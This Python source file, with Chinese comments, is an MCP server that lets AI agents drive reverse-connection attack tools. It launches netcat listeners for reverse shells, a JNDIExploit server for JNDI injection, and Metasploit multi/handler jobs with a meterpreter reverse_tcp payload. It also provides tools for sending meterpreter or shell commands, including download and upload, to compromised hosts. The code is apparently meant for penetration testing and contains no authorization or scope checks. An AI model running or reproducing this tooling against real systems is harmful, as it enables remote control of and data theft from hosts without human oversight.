"""
Reverse Tool MCP 服务（多 Pane 架构）

管理反连工具（nc/jndi/msf），以 MCP 协议暴露给 AI Agent 使用。

架构说明:
- 启动时不创建任何监听
- 客户端调用 get_session(type) 时创建独立 Pane
- 每个连接有唯一的 connection_id
- 支持多连接并发，通过 connection_id 区分
- 客户端调用 close_session(connection_id) 关闭指定连接

支持的工具类型:
- nc (netcat): 基础 TCP/UDP 监听
- jndi (JNDIExploit): JNDI 注入利用工具
- msf (metasploit): 渗透测试框架

命令行参数:
    --port    MCP 服务端口（默认: 8001）
    --host    监听地址（默认: 0.0.0.0）
"""

import os
import re
import uuid
import time
import atexit
import argparse
from typing import Annotated, Optional
from dataclasses import dataclass, field
from enum import Enum

import libtmux
from libtmux.window import PaneDirection
from fastmcp import FastMCP


# ============== 常量配置 ==============

# 默认配置（可通过环境变量覆盖）
DEFAULT_IP = os.getenv("REVERSE_IP", "192.168.52.101")
DEFAULT_NC_PORT = int(os.getenv("NC_PORT", "10080"))
DEFAULT_JNDI_LDAP_PORT = int(os.getenv("JNDI_LDAP_PORT", "1389"))
DEFAULT_JNDI_HTTP_PORT = int(os.getenv("JNDI_HTTP_PORT", "8080"))
DEFAULT_MSF_PORT = int(os.getenv("MSF_PORT", "4444"))
DEFAULT_WORKSPACE = os.getenv("WORKSPACE", "/opt/workspace")
DEFAULT_JNDI_JAR_PATH = os.path.join(DEFAULT_WORKSPACE, "JNDIExploit.jar")

# tmux session 名称前缀
TMUX_SESSION_NAME = "reverse_tools"

# MSF 专用常量
MSF_PROMPT = "msf6 >"
MSF_METERPRETER_PROMPT = "meterpreter >"


class ToolType(str, Enum):
    """反连工具类型"""
    NC = "nc"
    JNDI = "jndi"
    MSF = "msf"


@dataclass
class ConnectionInfo:
    """连接信息"""
    connection_id: str          # 唯一连接ID
    tool_type: ToolType         # 工具类型
    ip: str                     # 监听IP
    port: int                   # 监听端口
    pane_id: str                # tmux pane ID
    command: str                # 执行的命令
    verbose: str                # 描述信息
    created_at: float           # 创建时间
    status: str = "running"     # running/stopped/error

    def to_dict(self) -> dict:
        """转换为字典"""
        return {
            "connection_id": self.connection_id,
            "type": self.tool_type.value,
            "ip": self.ip,
            "port": self.port,
            "status": self.status,
            "verbose": self.verbose,
            "created_at": self.created_at
        }


@dataclass
class MsfHandlerInfo:
    """MSF Handler 信息"""
    handler_id: str             # handler 连接ID
    ip: str                     # 监听IP
    port: int                   # 监听端口
    payload: str                # payload 类型
    status: str = "running"     # running/stopped


@dataclass
class MsfSessionInfo:
    """MSF Session 信息（meterpreter 等）"""
    session_id: int             # MSF 内部 session ID
    session_type: str           # meterpreter/shell 等
    info: str                   # 连接信息（用户@IP）
    via: str                    # 通过哪个 handler 连接
    opened_at: float = 0        # 打开时间


class ReverseToolManager:
    """
    反连工具管理器（多 Pane 架构）

    使用单个 tmux session 管理多个 pane，每个 pane 是一个独立的监听实例。

    特殊处理:
    - NC/JNDI: 每个 connection_id 对应一个独立 pane
    - MSF: 单个 msfconsole 实例，内部管理多个 handler 和 session
    """

    def __init__(self):
        """初始化管理器"""
        self.server = libtmux.Server()
        self.session = None
        self.connections: dict[str, ConnectionInfo] = {}

        # 端口计数器（用于自动分配端口）
        self._port_counters: dict[ToolType, int] = {
            ToolType.NC: DEFAULT_NC_PORT,
            ToolType.JNDI: DEFAULT_JNDI_LDAP_PORT,
            ToolType.MSF: DEFAULT_MSF_PORT,
        }

        # MSF 专用状态
        self._msf_pane_id: Optional[str] = None           # msfconsole 的 pane ID
        self._msf_handlers: dict[str, MsfHandlerInfo] = {}  # handler_id -> info
        self._msf_sessions: dict[int, MsfSessionInfo] = {}  # session_id -> info

        # 注册退出清理
        atexit.register(self.close_all_sessions)

    def _ensure_session(self) -> libtmux.Session:
        """确保 tmux session 存在"""
        if self.session is None:
            try:
                # 尝试获取现有 session
                sessions = self.server.sessions.filter(session_name=TMUX_SESSION_NAME)
                if sessions:
                    self.session = sessions[0]
                else:
                    # 创建新 session，优先使用 WORKSPACE 环境变量
                    workspace_dir = os.getenv("WORKSPACE", "/opt/workspace")
                    self.session = self.server.new_session(
                        session_name=TMUX_SESSION_NAME,
                        attach=False,
                        start_directory=workspace_dir
                    )
                    self.session.set_option('status', 'off')
                    # 关闭默认的第一个 pane（如果不需要）
                    # 保留它作为占位
            except Exception as e:
                raise RuntimeError(f"创建 tmux session 失败: {repr(e)}")

        return self.session

    def _get_next_port(self, tool_type: ToolType) -> int:
        """获取下一个可用端口"""
        base_port = self._port_counters[tool_type]

        # 查找已使用的端口
        used_ports = set()
        for conn in self.connections.values():
            if conn.tool_type == tool_type:
                used_ports.add(conn.port)

        # MSF 还需要检查 handlers
        if tool_type == ToolType.MSF:
            for handler in self._msf_handlers.values():
                used_ports.add(handler.port)

        # 找到第一个未使用的端口
        port = base_port
        while port in used_ports:
            port += 1

        # 更新计数器
        self._port_counters[tool_type] = port + 1
        return port

    # ============== MSF 专用方法 ==============

    def _ensure_msf_console(self) -> tuple[bool, str]:
        """
        确保 msfconsole 正在运行

        Returns:
            (success, message): 成功标志和消息
        """
        if self._msf_pane_id:
            pane = self._get_pane_by_id(self._msf_pane_id)
            if pane:
                return True, "msfconsole 已运行"

        try:
            session = self._ensure_session()
            window = session.windows[0]

            # 创建新 pane
            pane = window.split(direction=PaneDirection.Right)
            self._msf_pane_id = pane.id

            # 启动 msfconsole
            pane.send_keys("msfconsole -q", enter=True)
            time.sleep(2)  # 等待 msfconsole 启动

            return True, "msfconsole 启动成功"
        except Exception as e:
            return False, f"msfconsole 启动失败: {repr(e)}"

    def _send_msf_command(self, command: str, wait: float = 0.5) -> str:
        """
        向 msfconsole 发送命令并获取输出

        Args:
            command: 要发送的命令
            wait: 等待时间（秒）

        Returns:
            命令输出
        """
        if not self._msf_pane_id:
            return "msfconsole 未运行"

        pane = self._get_pane_by_id(self._msf_pane_id)
        if not pane:
            return "msfconsole pane 不存在"

        try:
            pane.send_keys(command, enter=True)
            time.sleep(wait)
            output = pane.capture_pane()
            return '\n'.join(output) if output else ""
        except Exception as e:
            return f"命令执行失败: {repr(e)}"

    def _parse_msf_sessions(self) -> dict[int, MsfSessionInfo]:
        """
        解析 msf 的 session 列表

        Returns:
            session_id -> MsfSessionInfo 映射
        """
        sessions = {}

        # 发送 sessions -l 命令
        output = self._send_msf_command("sessions -l", wait=1.0)

        # 解析输出格式:
        # Active sessions
        # ===============
        #
        #   Id  Name  Type                     Information             Connection
        #   --  ----  ----                     -----------             ----------
        #   1         meterpreter x86/linux    root @ 192.168.1.100    192.168.52.101:4444 -> 192.168.1.100:12345 (192.168.1.100)
        #   2         shell x64/linux          www-data @ 10.0.0.50    192.168.52.101:4445 -> 10.0.0.50:54321 (10.0.0.50)

        lines = output.split('\n')
        for line in lines:
            # 匹配 session 行
            match = re.match(
                r'\s*(\d+)\s+(\S*)\s+(meterpreter|shell)\s+(\S+)\s+(.+)',
                line.strip()
            )
            if match:
                session_id = int(match.group(1))
                session_type = match.group(3)
                info = match.group(4)
                connection = match.group(5).strip()

                # 尝试解析 via (监听端口)
                via_match = re.search(r':(\d+)\s*->', connection)
                via_port = int(via_match.group(1)) if via_match else 0

                sessions[session_id] = MsfSessionInfo(
                    session_id=session_id,
                    session_type=session_type,
                    info=info,
                    via=f"port:{via_port}"
                )

        return sessions

    def _create_msf_handler(self, ip: str, port: int, payload: str = "linux/x64/meterpreter/reverse_tcp") -> tuple[bool, str, str]:
        """
        在 msfconsole 中创建 handler

        Args:
            ip: 监听IP
            port: 监听端口
            payload: payload 类型

        Returns:
            (success, message, handler_id): 成功标志、消息、handler ID
        """
        # 确保 msfconsole 运行
        success, msg = self._ensure_msf_console()
        if not success:
            return False, msg, ""

        # 生成 handler ID
        handler_id = f"msf_handler_{uuid.uuid4().hex[:8]}"

        # 构建 MSF 命令
        commands = [
            "use exploit/multi/handler",
            f"set PAYLOAD {payload}",
            f"set LHOST {ip}",
            f"set LPORT {port}",
            "set ExitOnSession false",
            "exploit -j"  # 后台运行
        ]

        # 发送命令
        for cmd in commands:
            self._send_msf_command(cmd, wait=0.3)

        time.sleep(0.5)  # 等待 handler 启动

        # 保存 handler 信息
        self._msf_handlers[handler_id] = MsfHandlerInfo(
            handler_id=handler_id,
            ip=ip,
            port=port,
            payload=payload,
            status="running"
        )

        return True, f"Handler 创建成功，监听 {ip}:{port}", handler_id

    def _interact_msf_session(self, session_id: int, command: str, wait: float = 1.0) -> str:
        """
        与 MSF session 交互

        Args:
            session_id: MSF session ID
            command: 要发送的命令
            wait: 等待时间

        Returns:
            命令输出
        """
        if not self._msf_pane_id:
            return "msfconsole 未运行"

        pane = self._get_pane_by_id(self._msf_pane_id)
        if not pane:
            return "msfconsole pane 不存在"

        try:
            # 进入 session
            pane.send_keys(f"sessions -i {session_id}", enter=True)
            time.sleep(0.5)

            # 发送命令
            pane.send_keys(command, enter=True)
            time.sleep(wait)

            # 获取输出
            output = pane.capture_pane()

            # 退出 session（发送 Ctrl-C 或 background）
            pane.send_keys("C-c", enter=False)
            time.sleep(0.3)
            pane.send_keys("background", enter=True)
            time.sleep(0.3)

            return '\n'.join(output) if output else ""
        except Exception as e:
            return f"交互失败: {repr(e)}"

    def _list_msf_handlers(self) -> list[dict]:
        """列出所有 MSF handlers"""
        result = []
        for handler in self._msf_handlers.values():
            result.append({
                "handler_id": handler.handler_id,
                "ip": handler.ip,
                "port": handler.port,
                "payload": handler.payload,
                "status": handler.status
            })
        return result

    def _kill_msf_handler(self, handler_id: str) -> tuple[bool, str]:
        """关闭指定的 MSF handler"""
        handler = self._msf_handlers.get(handler_id)
        if not handler:
            return False, f"Handler 不存在: {handler_id}"

        # 发送 jobs -K 或者通过端口找到 job 并 kill
        # 这里简化处理，标记为 stopped
        handler.status = "stopped"
        return True, f"Handler 已关闭: {handler_id}"

    def _build_command(self, tool_type: ToolType, ip: str, port: int) -> tuple[str, str]:
        """
        构建工具命令

        Returns:
            (command, verbose): 命令和描述
        """
        if tool_type == ToolType.NC:
            command = f"nc -lvvp {port}"
            verbose = f"netcat 监听器，IP: {ip}，端口: {port}"
        elif tool_type == ToolType.JNDI:
            http_port = port + 1  # HTTP 端口 = LDAP 端口 + 1
            command = f"java -jar {DEFAULT_JNDI_JAR_PATH} -i {ip} -l {port} -p {http_port}"
            verbose = f"JNDIExploit，IP: {ip}，LDAP: {port}, HTTP: {http_port}"
        elif tool_type == ToolType.MSF:
            command = (
                f'msfconsole -q -x "use exploit/multi/handler; '
                f'set PAYLOAD linux/x64/meterpreter/reverse_tcp; '
                f'set LHOST {ip}; set LPORT {port}; '
                f'set ExitOnSession false; exploit -j -z"'
            )
            verbose = f"Metasploit handler，IP: {ip}，端口: {port}，Payload: linux/x64/meterpreter/reverse_tcp"
        else:
            raise ValueError(f"未知的工具类型: {tool_type}")

        return command, verbose

    def _get_pane_by_id(self, pane_id: str) -> Optional[libtmux.Pane]:
        """通过 pane_id 获取 pane 对象"""
        try:
            session = self._ensure_session()
            for window in session.windows:
                for pane in window.panes:
                    if pane.id == pane_id:
                        return pane
        except Exception:
            pass
        return None

    def get_session(self, tool_type: str, port: Optional[int] = None, payload: Optional[str] = None) -> dict:
        """
        创建一个新的监听会话

        Args:
            tool_type: 工具类型 (nc/jndi/msf)
            port: 可选的端口号，不指定则自动分配
            payload: MSF 专用，payload 类型（默认: linux/x64/meterpreter/reverse_tcp）

        Returns:
            会话信息字典，包含 connection_id
        """
        # 验证工具类型
        try:
            t_type = ToolType(tool_type.lower())
        except ValueError:
            return {
                "connection_id": "",
                "type": tool_type,
                "ip": "",
                "port": 0,
                "status": "error",
                "verbose": f"未知的工具类型: {tool_type}，支持的类型: nc, jndi, msf"
            }

        # 获取 IP 和端口
        ip = DEFAULT_IP
        if port is None:
            port = self._get_next_port(t_type)

        # MSF 特殊处理： 单实例 + 多 handler
        if t_type == ToolType.MSF:
            return self._create_msf_session(ip, port, payload)

        # NC/JNDI: 每次创建独立 pane
        try:
            # 确保 session 存在
            session = self._ensure_session()

            # 构建命令
            command, verbose = self._build_command(t_type, ip, port)

            # 创建新 pane
            window = session.windows[0]

            # 如果是第一个连接，使用默认 pane；否则分割新 pane
            if len(self.connections) == 0 and len(window.panes) == 1:
                pane = window.panes[0]
            else:
                pane = window.split(direction=PaneDirection.Right)

            # 生成连接 ID
            connection_id = f"{t_type.value}_{uuid.uuid4().hex[:8]}"

            # 发送命令
            pane.send_keys(command, enter=True)
            time.sleep(0.5)  # 等待命令启动

            # 保存连接信息
            conn_info = ConnectionInfo(
                connection_id=connection_id,
                tool_type=t_type,
                ip=ip,
                port=port,
                pane_id=pane.id,
                command=command,
                verbose=verbose,
                created_at=time.time(),
                status="running"
            )
            self.connections[connection_id] = conn_info

            return conn_info.to_dict()

        except Exception as e:
            return {
                "connection_id": "",
                "type": tool_type,
                "ip": DEFAULT_IP,
                "port": port or 0,
                "status": "error",
                "verbose": f"创建会话失败: {repr(e)}"
            }

    def _create_msf_session(self, ip: str, port: int, payload: Optional[str] = None) -> dict:
        """
        创建 MSF handler（单实例模式）

        MSF 使用单个 msfconsole 实例，每次调用创建新的 handler。
        返回的 connection_id 实际上是 handler_id。
        """
        if payload is None:
            payload = "linux/x64/meterpreter/reverse_tcp"

        # 创建 handler
        success, message, handler_id = self._create_msf_handler(ip, port, payload)

        if not success:
            return {
                "connection_id": "",
                "type": "msf",
                "ip": ip,
                "port": port,
                "status": "error",
                "verbose": message
            }

        # 保存到 connections（便于统一管理）
        conn_info = ConnectionInfo(
            connection_id=handler_id,
            tool_type=ToolType.MSF,
            ip=ip,
            port=port,
            pane_id=self._msf_pane_id or "",
            command=f"handler {payload} on {ip}:{port}",
            verbose=f"MSF handler，IP: {ip}，端口: {port}，Payload: {payload}",
            created_at=time.time(),
            status="running"
        )
        self.connections[handler_id] = conn_info

        return conn_info.to_dict()

    def get_output(
        self,
        connection_id: str,
        start: str = "",
        end: str = ""
    ) -> str:
        """
        获取指定连接的终端输出

        Args:
            connection_id: 连接ID
            start: 起始行号（负数为历史记录）
            end: 结束行号

        Returns:
            终端输出内容
        """
        conn = self.connections.get(connection_id)
        if not conn:
            return f"连接不存在: {connection_id}"

        if conn.status == "stopped":
            return f"连接已关闭: {connection_id}"

        pane = self._get_pane_by_id(conn.pane_id)
        if not pane:
            conn.status = "error"
            return f"Pane 不存在: {connection_id}"

        try:
            output = pane.capture_pane(start, end)
            return '\n'.join(output) if output else ""
        except Exception as e:
            return f"获取输出失败: {repr(e)}"

    def send_keys(
        self,
        connection_id: str,
        keys: str,
        enter: bool = True
    ) -> str:
        """
        向指定连接发送命令

        Args:
            connection_id: 连接ID
            keys: 输入的文本或按键
            enter: 是否按回车

        Returns:
            执行后的输出
        """
        conn = self.connections.get(connection_id)
        if not conn:
            return f"连接不存在: {connection_id}"

        if conn.status == "stopped":
            return f"连接已关闭: {connection_id}"

        pane = self._get_pane_by_id(conn.pane_id)
        if not pane:
            conn.status = "error"
            return f"Pane 不存在: {connection_id}"

        try:
            pane.send_keys(keys, enter=enter)
            time.sleep(0.3)  # 等待命令执行

            output = pane.capture_pane()
            return '\n'.join(output) if output else ""
        except Exception as e:
            return f"发送命令失败: {repr(e)}"

    def close_session(self, connection_id: str) -> dict:
        """
        关闭指定的会话

        Args:
            connection_id: 连接ID

        Returns:
            操作结果
        """
        conn = self.connections.get(connection_id)
        if not conn:
            return {
                "connection_id": connection_id,
                "status": "error",
                "message": f"连接不存在: {connection_id}"
            }

        if conn.status == "stopped":
            return {
                "connection_id": connection_id,
                "status": "stopped",
                "message": f"连接已关闭: {connection_id}"
            }

        pane = self._get_pane_by_id(conn.pane_id)
        if pane:
            try:
                # 发送 Ctrl-C 终止进程
                pane.send_keys("C-c", enter=False)
                time.sleep(0.3)

                # 如果有其他 pane，关闭当前 pane
                session = self._ensure_session()
                if len(session.windows[0].panes) > 1:
                    pane.send_keys("exit", enter=True)
                    time.sleep(0.2)

            except Exception:
                pass

        conn.status = "stopped"

        return {
            "connection_id": connection_id,
            "status": "stopped",
            "message": f"连接已关闭: {connection_id}"
        }

    def list_sessions(self) -> list[dict]:
        """
        列出所有会话

        Returns:
            会话列表
        """
        result = []
        for conn in self.connections.values():
            # 检查 pane 是否仍然存在
            if conn.status == "running":
                pane = self._get_pane_by_id(conn.pane_id)
                if not pane:
                    conn.status = "error"

            result.append(conn.to_dict())

        return result

    def get_session_info(self, connection_id: str) -> dict:
        """
        获取指定会话的详细信息

        Args:
            connection_id: 连接ID

        Returns:
            会话信息
        """
        conn = self.connections.get(connection_id)
        if not conn:
            return {
                "connection_id": connection_id,
                "type": "",
                "ip": "",
                "port": 0,
                "status": "error",
                "verbose": f"连接不存在: {connection_id}"
            }

        # 检查 pane 是否仍然存在
        if conn.status == "running":
            pane = self._get_pane_by_id(conn.pane_id)
            if not pane:
                conn.status = "error"

        return conn.to_dict()

    def close_all_sessions(self) -> dict[str, dict]:
        """
        关闭所有会话

        Returns:
            各会话的关闭结果
        """
        results = {}
        for connection_id in list(self.connections.keys()):
            results[connection_id] = self.close_session(connection_id)

        # 尝试关闭 tmux session
        if self.session:
            try:
                self.session.kill()
            except Exception:
                pass
            self.session = None

        return results


# ============== MCP 服务定义 ==============

mcp = FastMCP("Reverse Tool - 反连工具管理（多连接版）")

# 全局管理器实例（在 main 中初始化）
manager: Optional[ReverseToolManager] = None


@mcp.tool(output_schema=None)
def get_session(
    type: Annotated[str, "工具类型: nc (netcat) / jndi (JNDIExploit) / msf (metasploit)"],
    port: Annotated[Optional[int], "可选的端口号，不指定则自动分配"] = None,
    payload: Annotated[Optional[str], "MSF 专用: payload 类型（默认: linux/x64/meterpreter/reverse_tcp)"] = None
) -> dict:
    """
    创建一个新的反连工具监听会话。

    工作模式:
    - NC/JNDI: 每次调用创建独立 pane，多个监听并发
    - MSF: 单个 msfconsole 实例，内部管理多个 handler

    使用场景:
    - 创建 nc 监听器用于接收反弹 shell
    - 创建 JNDI 服务用于 JNDI 注入
    - 创建 MSF handler 用于 meterpreter 会话（可指定 payload）

    Returns:
        dict: 包含 connection_id, type, ip, port, status, verbose 字段
    """
    return manager.get_session(type, port, payload)


@mcp.tool(output_schema=None)
def get_output(
    connection_id: Annotated[str, "连接ID（由 get_session 返回）"],
    start: Annotated[Optional[str], "起始行号（负数为历史记录）"] = "",
    end: Annotated[Optional[str], "结束行号"] = ""
) -> str:
    """
    获取指定连接的终端输出。

    用于查看工具的实时输出，例如：
    - nc 收到的反弹 shell 连接
    - JNDI 收到的 LDAP 请求
    - MSF 收到的 session 连接

    Args:
        connection_id: 连接ID（从 get_session 获取）
        start: 起始行号（负数表示历史记录，如 "-100" 获取最后100行）
        end: 结束行号

    Returns:
        str: 终端输出内容
    """
    return manager.get_output(connection_id, start or "", end or "")


@mcp.tool(output_schema=None)
def send_keys(
    connection_id: Annotated[str, "连接ID（由 get_session 返回）"],
    keys: Annotated[str, "输入的文本或按键 (C-c=Ctrl+c, C-[=Esc)"],
    enter: Annotated[bool, "是否按回车"] = True
) -> str:
    """
    向指定连接发送命令。

    用于与工具交互，例如：
    - 向 nc shell 发送命令
    - 向 MSF 发送 meterpreter 命令

    Args:
        connection_id: 连接ID（从 get_session 获取）
        keys: 输入的文本或特殊按键
        enter: 是否按回车执行

    Returns:
        str: 命令执行后的输出
    """
    return manager.send_keys(connection_id, keys, enter)


@mcp.tool(output_schema=None)
def close_session(
    connection_id: Annotated[str, "要关闭的连接ID"]
) -> dict:
    """
    关闭指定的监听会话。

    会终止监听进程并释放相关资源。

    Args:
        connection_id: 要关闭的连接ID

    Returns:
        dict: 包含 connection_id, status, message 字段
    """
    return manager.close_session(connection_id)


@mcp.tool(output_schema=None)
def list_sessions() -> list[dict]:
    """
    列出所有会话状态。

    Returns:
        list[dict]: 会话列表，每项包含 connection_id, type, ip, port, status, verbose
    """
    return manager.list_sessions()


@mcp.tool(output_schema=None)
def get_session_info(
    connection_id: Annotated[str, "连接ID"]
) -> dict:
    """
    获取指定会话的详细信息。

    Args:
        connection_id: 连接ID

    Returns:
        dict: 会话详细信息
    """
    return manager.get_session_info(connection_id)


# ============== MSF 专用 API ==============

@mcp.tool(output_schema=None)
def list_msf_handlers() -> list[dict]:
    """
    列出所有 MSF handlers。

    Returns:
        list[dict]: handler 列表，每项包含 handler_id, ip, port, payload, status
    """
    return manager._list_msf_handlers()


@mcp.tool(output_schema=None)
def list_msf_sessions() -> list[dict]:
    """
    列出所有 MSF meterpreter/shell sessions。

    这些是已经建立连接的会话（反弹回来的 shell）。

    Returns:
        list[dict]: session 列表，每项包含 session_id, type, info, via
    """
    sessions = manager._parse_msf_sessions()
    return [
        {
            "session_id": s.session_id,
            "type": s.session_type,
            "info": s.info,
            "via": s.via
        }
        for s in sessions.values()
    ]


@mcp.tool(output_schema=None)
def interact_msf_session(
    session_id: Annotated[int, "MSF session ID（从 list_msf_sessions 获取）"],
    command: Annotated[str, "要执行的 meterpreter 命令"],
    wait: Annotated[float, "等待时间（秒）"] = 1.0
) -> str:
    """
    与 MSF session 交互（meterpreter/shell）。

    用于向已连接的 session 发送命令，例如：
    - meterpreter: sysinfo, getuid, shell, download, upload
    - shell: 任何系统命令

    Args:
        session_id: MSF session ID
        command: 要执行的命令
        wait: 等待命令执行的时间（秒）

    Returns:
        str: 命令输出
    """
    return manager._interact_msf_session(session_id, command, wait)


@mcp.tool(output_schema=None)
def get_msf_output(
    start: Annotated[Optional[str], "起始行号（负数为历史记录）"] = "",
    end: Annotated[Optional[str], "结束行号"] = ""
) -> str:
    """
    获取 msfconsole 的输出。

    用于查看 msfconsole 的整体输出，包括：
    - handler 启动状态
    - 新 session 连接通知
    - 其他 msf 消息

    Args:
        start: 起始行号
        end: 结束行号

    Returns:
        str: msfconsole 输出
    """
    if not manager._msf_pane_id:
        return "msfconsole 未运行"

    pane = manager._get_pane_by_id(manager._msf_pane_id)
    if not pane:
        return "msfconsole pane 不存在"

    try:
        output = pane.capture_pane(start or None, end or None)
        return '\n'.join(output) if output else ""
    except Exception as e:
        return f"获取输出失败: {repr(e)}"


# ============== 主入口 ==============

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Reverse Tool MCP 服务 - 管理反连工具（nc/jndi/msf）多连接版"
    )
    parser.add_argument("--port", type=int, default=8001,
                        help="MCP 服务端口（默认: 8001）")
    parser.add_argument("--host", type=str, default="0.0.0.0",
                        help="监听地址（默认: 0.0.0.0）")
    args = parser.parse_args()

    # 初始化管理器
    manager = ReverseToolManager()

    print(f"Reverse Tool MCP 服务启动（多连接版）")
    print(f"监听: {args.host}:{args.port}")
    print(f"支持工具: nc, jndi, msf")
    print(f"")
    print(f"使用方式:")
    print(f"  1. 调用 get_session(type) 创建监听，获取 connection_id")
    print(f"  2. 使用 connection_id 调用 get_output/send_keys 操作")
    print(f"  3. 调用 close_session(connection_id) 关闭监听")

    mcp.run(transport="streamable-http", host=args.host, port=args.port, stateless_http=True)
